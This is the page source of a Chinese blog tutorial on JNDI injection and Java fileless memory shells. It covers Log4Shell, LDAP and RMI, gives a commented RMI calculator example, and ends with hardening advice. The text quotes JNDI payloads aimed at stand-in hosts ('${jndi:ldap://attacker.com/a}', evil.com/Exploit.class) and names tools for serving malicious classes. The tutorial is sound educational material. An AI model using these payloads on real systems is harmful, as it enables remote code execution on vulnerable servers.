<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>JNDI注入 | star徐的博客</title><meta name=keywords content="Java,JNDI注入,Web安全,基础编程,网络安全"><meta name=description content="JNDI注入
什么是内存马
内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。
内存马常见类别
• Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。
• Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。
• 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。
• 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行
为什么会存在内存马
根本原因在于 Java 的“动态性”：
• 类可以在运行时从网络、数据库或其他非文件源加载；
• 字节码可以被 Instrumentation API 在运行时修改；
• 反射和动态代理允许在不改动源码的前提下改变程序行为。
攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。
Java 架构如何助长内存马
• JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类；
• 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制；
• “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。
因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。
一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。
一、什么是JNDI注入
JNDI为什么会成为黑客的工具
1.1 一句话区分：
JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。"><meta name=author content="您的姓名"><link rel=canonical href=http://ljj1992.fun/posts/jndi%E6%B3%A8%E5%85%A5/><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=http://ljj1992.fun/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://ljj1992.fun/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://ljj1992.fun/favicon-32x32.png><link rel=apple-touch-icon href=http://ljj1992.fun/apple-touch-icon.png><link rel=mask-icon href=http://ljj1992.fun/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://ljj1992.fun/posts/jndi%E6%B3%A8%E5%85%A5/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://ljj1992.fun/posts/jndi%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="star徐的博客"><meta property="og:title" content="JNDI注入"><meta property="og:description" content="JNDI注入 什么是内存马 内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。
内存马常见类别 • Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。 • Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。 • 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。 • 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行
为什么会存在内存马 根本原因在于 Java 的“动态性”： • 类可以在运行时从网络、数据库或其他非文件源加载； • 字节码可以被 Instrumentation API 在运行时修改； • 反射和动态代理允许在不改动源码的前提下改变程序行为。 攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。
Java 架构如何助长内存马 • JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类； • 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制； • “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。 因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。
一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。
一、什么是JNDI注入 JNDI为什么会成为黑客的工具
1.1 一句话区分： JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-21T12:44:00+08:00"><meta property="article:modified_time" content="2025-11-21T12:44:00+08:00"><meta property="article:tag" content="Java"><meta property="article:tag" content="JNDI注入"><meta property="article:tag" content="Web安全"><meta property="article:tag" content="基础编程"><meta property="article:tag" content="网络安全"><meta name=twitter:card content="summary"><meta name=twitter:title content="JNDI注入"><meta name=twitter:description content="JNDI注入
什么是内存马
内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。
内存马常见类别
• Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。
• Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。
• 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。
• 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行
为什么会存在内存马
根本原因在于 Java 的“动态性”：
• 类可以在运行时从网络、数据库或其他非文件源加载；
• 字节码可以被 Instrumentation API 在运行时修改；
• 反射和动态代理允许在不改动源码的前提下改变程序行为。
攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。
Java 架构如何助长内存马
• JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类；
• 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制；
• “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。
因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。
一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。
一、什么是JNDI注入
JNDI为什么会成为黑客的工具
1.1 一句话区分：
JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://ljj1992.fun/posts/"},{"@type":"ListItem","position":2,"name":"JNDI注入","item":"http://ljj1992.fun/posts/jndi%E6%B3%A8%E5%85%A5/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"JNDI注入","name":"JNDI注入","description":"JNDI注入 什么是内存马 内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。\n内存马常见类别 • Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。 • Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。 • 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。 • 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行\n为什么会存在内存马 根本原因在于 Java 的“动态性”： • 类可以在运行时从网络、数据库或其他非文件源加载； • 字节码可以被 Instrumentation API 在运行时修改； • 反射和动态代理允许在不改动源码的前提下改变程序行为。 攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。\nJava 架构如何助长内存马 • JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类； • 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制； • “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。 因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。\n一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。\n一、什么是JNDI注入 JNDI为什么会成为黑客的工具\n1.1 一句话区分： JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。\n","keywords":["Java","JNDI注入","Web安全","基础编程","网络安全"],"articleBody":"JNDI注入 什么是内存马 内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 里，它通常表现为一个被动态加载到 JVM 内存中的恶意类，可以接收远程指令、执行任意命令或窃取敏感数据。\n内存马常见类别 • Servlet 型：通过篡改或新增 Servlet、Filter、Listener 实现流量拦截与命令执行。 • Agent 型：利用 Java Instrumentation API 在运行时修改已有类的字节码，植入后门。 • 动态代理/反射型：通过 Proxy、InvocationHandler 或反射机制把恶意逻辑挂接到正常业务流程中。 • 代码执行型：借助脚本引擎（如 Nashorn、Groovy）把恶意脚本直接加载到内存并执行\n为什么会存在内存马 根本原因在于 Java 的“动态性”： • 类可以在运行时从网络、数据库或其他非文件源加载； • 字节码可以被 Instrumentation API 在运行时修改； • 反射和动态代理允许在不改动源码的前提下改变程序行为。 攻击者正是利用这些特性，把恶意代码“注入”到正在运行的 JVM 里，而不留下任何文件痕迹。\nJava 架构如何助长内存马 • JVM 的类加载机制是“按需加载”，运行时可随时从任意来源读取字节码并定义成类； • 运行时数据区（堆、方法区等）对动态生成的类和对象没有额外限制； • “沙箱”模型只在早期 Applet 时代严格实施，现代服务器应用往往以全权模式运行，一旦获得 ClassLoader 或 Instrumentation 实例，就能突破信任边界。 因此，只要攻击者拿到能够动态加载或修改字节码的入口（如反序列化漏洞、JNDI 注入、Groovy 脚本执行等），就能把恶意逻辑直接塞进内存，形成无文件驻留。\n一句话总结：内存马的本质是“把恶意代码当成普通 Java 类一样加载到内存并执行”，它之所以能成为“无文件”，正是因为 Java 的类加载、字节码改写和反射机制允许在不落地文件的前提下完成整个攻击链。\n一、什么是JNDI注入 JNDI为什么会成为黑客的工具\n1.1 一句话区分： JNDI 注入是黑客把“资源查找”这把正经钥匙，拧成了撬锁的铁丝。\n1.2 JNDI注入的核心到底是什么？ 核心只有一句话：\n攻击者能够控制传给 JNDI lookup() 的字符串，从而让受害者程序去加载并执行攻击者指定的恶意代码。\n换成大白话： 程序本来应该只查“jdbc/myDS”这种安全的名字，结果你让我查“ldap://evil.com/badclass”，我就真的去 evil.com 下载并执行那个坏类——这就中招了。\n解释 lookup() ： JNDI 本身不是黑客发明的，它是 JavaEE 里用来“按名字找资源”的一套标准 API，比如找数据库、远程对象、LDAP 条目等，初衷是让开发更方便。 JNDI 注入则是黑客发现： • lookup() 的参数如果来自用户输入，就能被拼成恶意 URI（ldap://、rmi:// 等）； • 目标服务器会乖乖去请求攻击者控制的目录服务； • 返回的恶意 Reference 可触发远程类加载，最终在内存里执行任意代码。 因此，它并不是为解决某种问题而设计的“安全行为”，而是开发人员在使用 JNDI 时，对 lookup 字符串缺乏严格校验，被黑客逆向利用形成的安全漏洞。 1.3 为什么JNDI会去加载远程的恶意类？原理是怎么样的？ 关键在于 Java 的一个类：javax.naming.InitialContext 在 lookup 的时候，默认信任并自动反序列化某些协议返回的对象。\n支持的危险协议（能加载远程代码的）主要有三个：\nRMI（上面代码用的） LDAP（最常见、最危险，Log4Shell 就是这个） CORBA（已经基本废弃） 其中 LDAP 最可怕，因为 LDAP 服务器可以直接返回一个包含 远程 class 文件 URL 的对象，Java 会自动去下载并执行那个 class 中的 static 代码块或者构造函数。\n流程图（Log4Shell 最典型）：\n用户输入: ${jndi:ldap://evil.com/Exploit} → log4j 傻乎乎地把这行字符串交给 JNDI lookup → JNDI 去 evil.com 的 LDAP 服务问 \"Exploit 这个名字对应什么对象？\" → 恶意的 LDAP 服务器返回：这个对象是个 Java 类，类文件在 http://evil.com/Exploit.class → JVM 自动下载 Exploit.class 并实例化 → Exploit.class 的 static {} 块或者构造函数里执行 Runtime.getRuntime().exec(\"calc.exe\") → 服务器直接被弹计算器 / 挖矿 / 后门 1.4 什么是按名字找资源 大白话解释 想象一下，你去图书馆借一本名为《哈利·波特与魔法石》的书：\n你提供名字：你告诉图书管理员书名，就像在电脑中输入资源的名称一样。 图书管理员查找目录：图书管理员会查看图书馆的目录，找到这本书的编号和所在位置，就像电脑在内部查找资源的位置一样。 图书管理员取书：根据目录信息，图书管理员去书架上找到这本书，然后交给你，就像电脑从指定位置读取资源并提供给你一样。 原理结合 在计算机中，按名字找资源的过程类似：\n资源命名：每个资源（如文件、数据库连接、网络服务等）都有一个唯一的名称，就像每本书都有一个书名。 建立目录：操作系统或应用程序会维护一个资源目录，记录资源名称和实际位置的对应关系，就像图书馆的目录一样。 查找资源 你提供名称：在程序中，你通过名称请求资源，就像告诉图书管理员书名。 系统查找目录：系统根据你提供的名称，在资源目录中查找对应的实际位置。 获取资源：系统从找到的位置读取资源，并提供给程序使用。 简单例子说明 文件资源：你在电脑上打开一个名为 report.docx 的文件，操作系统会根据文件名在硬盘上找到对应的文件内容。 数据库连接：在程序中，你使用名称 jdbc/MyDatabase 获取数据库连接，JNDI 会查找目录，找到实际的数据库连接信息并返回给你。\n再次打个最简单的比喻： ​ 你去星巴克点咖啡，你不会直接冲进后厨找咖啡豆吧？你会对服务员说：“我要一杯美式”。 服务员（前台）就去后厨给你拿——这个“服务员+菜单”就是 JNDI。\n在Java世界里，很多资源都有名字：\n数据库连接池叫 “jdbc/myDS” 队列叫 “jms/myQueue” 远程对象（RMI）叫 “rmi://ip:1099/AddService” 程序只需要说：“给我 jdbc/myDS 这个东西”，JNDI 就负责帮你去找、创建、返回真正的对象。\n所以 JNDI 本来是为了让程序更灵活、更容易配置而生的，程序员不用硬编码 IP、端口、驱动类名，只要改配置文件就行。\n总结 按名字找资源的核心是：\n命名：给资源起一个唯一的名字。 目录：建立资源名称与实际位置的映射关系。 查找：根据名称在目录中查找，获取资源。 二、什么是LDAP和RMI协议 ldap:// 和 rmi:// 就像 http:// 一样，都是一串“协议前缀”，用来告诉程序“接下来要用哪种协议去访问资源”。\nldap:// 相当于“目录查询专用浏览器”。 例：ldap://192.168.1.100:389/dc=company,dc=com 意思是“用 LDAP 协议去 192.168.1.100 这台目录服务器的 389 端口，查找 company.com 这个范围下的条目”。 它不传网页，而是传“用户、部门、权限”这类结构化信息。 rmi:// 相当于“远程对象调用专线”。 例：rmi://192.168.1.200:1099/Calculator 意思是“用 RMI 协议去 192.168.1.200 的 1099 端口，调用名叫 Calculator 的远程对象”。 它不传网页，而是让本地程序像调用本地方法一样执行远程对象的方法。 与 HTTP 的异同\n相同：都用“协议://地址:端口/路径”的格式，都是通过网络获取东西。 不同： – HTTP 拿的是网页、图片、JSON 等数据； – LDAP 拿的是目录条目（用户、组、权限）； – RMI 拿的是可远程调用的对象句柄。 三、远程加法计算器例子 我们用“远程加法计算器”这个例子，把 RMI 拆成三步：\n定义“能远程调用的功能”——就像贴出一份“我能干啥”的告示； 服务器把真正的计算方法挂在网上； 客户端拿着告示去远程找服务器算结果。 第一步：写一张“告示”（接口） // 告示：只要谁能提供 add 方法，就可以远程调用 public interface AddServerIntf extends java.rmi.Remote { // 接收两个 double，返回和；可能抛 RemoteException double add(double a, double b) throws java.rmi.RemoteException; } 第 1 行：interface 就是贴一张“告示”，告诉别人“我能干啥”。 第 2 行：extends java.rmi.Remote 意思是“这张告示是允许远程调用的”。 第 3 行：double add(...) 告诉别人“我能把两个小数相加，并把结果返回”。 throws RemoteException：远程调用可能出网络问题，所以提前说“如果出错，我会抛异常”。 第二步：服务器（真正的计算器） // 真正的加法器 public class AddServerImpl extends java.rmi.server.UnicastRemoteObject implements AddServerIntf { // 必须有默认构造函数，且抛 RemoteException protected AddServerImpl() throws java.rmi.RemoteException { super(); } // 实现告示里的 add 方法 @Override public double add(double a, double b) throws java.rmi.RemoteException { System.out.println(\"服务器正在计算 \" + a + \" + \" + b); return a + b; } public static void main(String[] args) { try { // 1. 启动 RMI registry（相当于一个“黄页”服务） java.rmi.registry.LocateRegistry.createRegistry(1099); // 2. 把我们的加法器实例注册到黄页，取名叫 \"AddService\" AddServerIntf stub = new AddServerImpl(); java.rmi.Naming.rebind(\"AddService\", stub); System.out.println(\"服务器已启动，等待客户端调用...\"); } catch (Exception e) { e.printStackTrace(); } } } 第 1 行：class AddServerImpl 就是“真正的计算器”。 第 2 行：extends UnicastRemoteObject 意思是“我把自己变成能远程访问的对象”。 第 3 行：implements AddServerIntf 意思是“我按照告示上的内容，把真正的加法逻辑写在这里”。 第 4-6 行：构造方法，告诉 JVM“我需要远程能力，所以调用 super()”。 第 7-9 行：真正的加法逻辑，跟普通 Java 方法一样，只是多抛了一个 RemoteException。 第 10-14 行：main方法就是“把计算器挂到网上”。 第 11 行：先 new 一个计算器实例。 第 12 行：Naming.rebind(...) 相当于把计算器注册到“电话簿”（RMI Registry），名字叫 AddServer，别人只要查这个名字就能找到它。 第 13 行：打印“服务已启动”，表示挂好了。 第三步：客户端（远程调用者） public class AddClient { public static void main(String[] args) { try { // 1. 找到服务器的黄页（假设服务器在 192.168.1.100） String url = \"rmi://192.168.1.100:1099/AddService\"; // 2. 从黄页里取出名为 \"AddService\" 的远程对象 AddServerIntf stub = (AddServerIntf) java.rmi.Naming.lookup(url); // 3. 像调用本地方法一样调用远程方法 double result = stub.add(3.5, 4.2); System.out.println(\"远程计算结果: \" + result); } catch (Exception e) { e.printStackTrace(); } } } 第 1-2 行：main 方法就是“远程调用者”。 第 3 行：Naming.lookup(...) 相当于去“电话簿”里查名字叫 AddServer 的计算器。 第 4 行：拿到计算器后，直接调用 add(3.0, 5.0)，就像调用本地方法一样。 第 5 行：打印结果，看到 3 + 5 = 8.0。 一句话总结\n告示（接口）：告诉别人“我能远程加法”。 服务器：把真正的加法器挂到网上。 客户端：去网上查名字，拿到计算器，直接调用，就像本地一样。 原理：\nlookup 就是去黄页里按名字找“谁能提供 add”； 找到后返回一个“代理”（stub），它看起来像本地对象，实际内部会把参数打包、发到网络、等服务器返回结果； 整个过程对程序员透明，就像调用本地方法一样。 一句话总结 RMI 就是“把本地对象搬到网上，让别人像调用本地方法一样调用远程方法”，中间的打包、发包、解包、回包都由 RMI 框架自动完成。\n四、补充： 4.1 为什么这么好的技术会被黑客利用？时间线简单说一下 2015-2016 年左右，安全研究员就发现 JNDI + LDAP/RMI 可以远程加载代码\n2016 年 Jenkins、WebLogic 等很多知名中间件被爆 JNDI 注入漏洞（就是用户能控制 lookup 的名字）\n2021年12月 Log4Shell（log4j2）彻底引爆全世界，因为几乎所有 Java 项目都用了 log4j，而且日志会直接打印用户输入，等于用户一句话就能触发 JNDI 注入\n到现在（2025年），JNDI 注入仍然是 Java 应用中最常见的严重漏洞之一。\n4.2 黑客到底是怎么实际利用的？（真实攻击链） 1.找到一个能控制 JNDI lookup 参数的地方（常见入口）：\n日志（Log4Shell） HTTP Header（如 User-Agent、X-Forwarded-For） URL 参数、JSON 参数 WebLogic 的 T3/IIOP 协议、各种反序列化点 2.构造 payload（最经典的）：\n${jndi:ldap://attacker.com/a} ${jndi:rmi://attacker.com/a} 3.攻击者在自己的 VPS 上：\n启动恶意 LDAP 服务器（用 marshalsec、rogue-jndi 等工具，几行命令就行） 放一个恶意的 Exploit.class（里面执行 calc.exe 或反弹 shell） 4.受害者服务器一收到 payload → 自动去下载并执行 → 中招\n4.3 几个关键点（非常重要！） 你可能忽略的点 解释 即使你没有用 log4j，只要程序里有 new InitialContext().lookup(userInput) 就可能中招 很多老项目、各种框架都自己写了 JNDI 查询 默认情况下，JDK 8u191 之后已经禁掉了远程 class 加载（com.sun.jndi.ldap.object.trustURLCodebase=false） 但很多老系统还是 JDK8u181 之前，或者手动把这个参数改回来了 RMI 也可以触发（上面代码就是），只是没有 LDAP 那么方便 2023-2024 年还有很多 RMI 注入漏洞被挖 即使禁掉了远程代码加载，仍然可能有反序列化 Gadget 链 YSOSerial 的 gadget 可以直接在本地触发危险操作 Spring、Jackson、Fastjson 等反序列化漏洞很多时候也会间接触发 JNDI 它们在反序列化时会走到 JNDI lookup 总结（给小白的防JNDI注入口诀） 永远不要把用户输入直接交给 InitialContext.lookup() 或 Naming.lookup()\n如果一定要用，设置以下 JVM 参数（强烈推荐）：\n-Dcom.sun.jndi.rmi.object.trustURLCodebase=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false 3.升级到最新 JDK（JDK 11+、17+ 默认已经禁掉远程加载）\n4.用 WAF 或日志监控拦截 ${jndi: 这类特征\n完整源码 // =============================================================== // 文件名：AddServerWithFullComments.java // 作用：完整的 Java RMI + JNDI 示例，带超级详细的逐行中文注释 // 适合：Java 小白 + 刚学网络安全的同学 // 警告：这个代码本身是教学用的，但演示了 JNDI 注入的原理！ // 生产环境绝对不要把用户输入直接给 lookup() 用！！！ // =============================================================== import java.rmi.Remote; // Remote 是所有远程接口必须继承的标记接口 import java.rmi.RemoteException; // 远程方法必须抛出的异常 import java.rmi.server.UnicastRemoteObject; // 实现远程对象时要继承的父类 import java.rmi.registry.LocateRegistry; // 用于创建本地 RMI 注册中心（黄页） import java.rmi.Naming; // 用来绑定和查找远程对象（旧 API，但经典） // 第一部分：远程接口（相当于“服务合同、告示”） // 只要谁实现了这个接口并注册，就允许别人远程调用 add 方法 public interface AddServerIntf extends Remote { // 必须继承 java.rmi.Remote // 定义一个远程方法：接收两个 double，返回它们的和 // 所有远程方法都必须声明 throws RemoteException（因为网络可能出问题） double add(double a, double b) throws RemoteException; } // 第二部分：远程对象的真正实现类 public class AddServerImpl extends UnicastRemoteObject implements AddServerIntf { // 必须同时继承 UnicastRemoteObject 并实现上面的接口 // 必须提供一个（可以是 protected）构造函数，并且要抛 RemoteException // 为什么？因为 UnicastRemoteObject 的构造函数会抛这个异常 protected AddServerImpl() throws RemoteException { super(); // 调用父类 UnicastRemoteObject 的无参构造函数 // super() 这行可以省略，但写出来更清晰 } // 真正实现加法逻辑 @Override public double add(double a, double b) throws RemoteException { System.out.println(\"【服务器端】正在计算 \" + a + \" + \" + b); // 这里可以写任意复杂逻辑，客户端调用时就会在服务器机器上执行 return a + b; } // ==================== 服务器启动入口 ==================== public static void main(String[] args) { try { // 第1步：在本机 1099 端口启动一个 RMI 注册中心（相当于“电话黄页”） // 如果这行不执行，客户端就找不到服务（会报 Connection refused） LocateRegistry.createRegistry(1099); System.out.println(\"RMI 注册中心已在 1099 端口启动成功\"); // 第2步：创建远程对象实例（这一步会自动生成一个“stub”存根对象） // stub 是客户端真正拿到的“代理”，它负责把方法调用通过网络发给服务器 AddServerImpl impl = new AddServerImpl(); // 第3步：把这个服务用名字 \"AddService\" 绑定到注册中心 // 绑定后，别人就可以通过名字找到它 // rebind 的意思是：如果名字已存在就覆盖（bind 是如果存在就报错） Naming.rebind(\"AddService\", impl); // 完整的绑定名字其实是：rmi://localhost:1099/AddService // 但在本机可以省略 ip 和端口 System.out.println(\"加法服务已成功注册，名字 = AddService\"); System.out.println(\"服务器已就绪，等待客户端远程调用...\"); System.out.println(\"按 Ctrl+C 可以停止服务器\"); } catch (Exception e) { // 任何异常都打印出来（启动失败常见原因是端口被占用） System.err.println(\"服务器启动失败！\"); e.printStackTrace(); } } } // ==================== 客户端代码（写在同一个文件里方便学习）=================== class AddClient { // 客户端只需要一个 main 方法，不需要实现任何远程接口 public static void main(String[] args) { try { // 第1步：拼出远程服务的完整 JNDI 名字 // 格式：rmi://ip:端口/服务名 // 如果服务器和客户端在同一台机器，可以写 rmi:///AddService 或 rmi://127.0.0.1/AddService String url = \"rmi://127.0.0.1:1099/AddService\"; // 注意：这里如果把 url 换成用户输入，就是经典的 JNDI 注入点了！！！ System.out.println(\"客户端正在连接服务器：\" + url); // 第2步：关键的 JNDI lookup 操作（最容易出安全问题的点） // 从注册中心查找名为 \"AddService\" 的远程对象，返回的是 stub（代理） // 如果这里 url 是用户可控的，攻击者就可以让你去 rmi://evil.com/BadObj AddServerIntf stub = (AddServerIntf) Naming.lookup(url); System.out.println(\"成功拿到远程对象的代理（stub）\"); // 第3步：像调用本地方法一样调用远程方法 // 实际上底层会通过网络把参数序列化发给服务器，服务器计算完再返回 double result = stub.add(13.5, 28.7); // 结果是在服务器算的，但打印是在客户端 System.out.println(\"【客户端】远程计算结果：13.5 + 28.7 = \" + result); // 再测一次 System.out.println(\"再来一次：stub.add(100, 200) = \" + stub.add(100, 200)); } catch (Exception e) { System.err.println(\"客户端调用失败！\"); // 常见原因：服务器没开、ip写错、防火墙、名字不对、没启动 registry e.printStackTrace(); } } } 使用方法（小白专用步骤）： 把上面所有代码复制到一个新文件，命名为 AddServerWithFullComments.java 先用 javac AddServerWithFullComments.java 编译（会生成很多 .class 文件） 开两个终端： 终端1（服务器）：java AddServerImpl 终端2（客户端）：java AddClient 你就会看到服务器打印计算日志，客户端打印结果 这样你就把“JNDI 注入原理示例 + 超详细逐行注释”完整保存在一个文件里了，随时可以拿出来复习～\n有需要我再给你拆成三个独立文件（接口、服务器、客户端）或者加上安全加固版的代码也可以随时说\n","wordCount":"1013","inLanguage":"en","datePublished":"2025-11-21T12:44:00+08:00","dateModified":"2025-11-21T12:44:00+08:00","author":{"@type":"Person","name":"您的姓名"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://ljj1992.fun/posts/jndi%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"star徐的博客","logo":{"@type":"ImageObject","url":"http://ljj1992.fun/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://ljj1992.fun/ accesskey=h title="star徐的博客 (Alt + H)">star徐的博客</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://ljj1992.fun/ title=首页><span>首页</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://ljj1992.fun/>Home</a>&nbsp;»&nbsp;<a href=http://ljj1992.fun/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">JNDI注入</h1><div class=post-meta><span title='2025-11-21 12:44:00 +0800 +0800'>November 21, 2025</span>&nbsp;·&nbsp;<span>您的姓名</span></div></header><div class=post-content><h1 id=jndi注入>JNDI注入<a hidden class=anchor aria-hidden=true href=#jndi注入>#</a></h1><h2 id=什么是内存马><strong>什么是内存马</strong><a hidden class=anchor aria-hidden=true href=#什么是内存马>#</a></h2><p>内存马是一段仅驻留在服务器内存中的恶意代码，它不写入磁盘文件，因此传统基于文件扫描的杀毒软件很难发现。在 Java 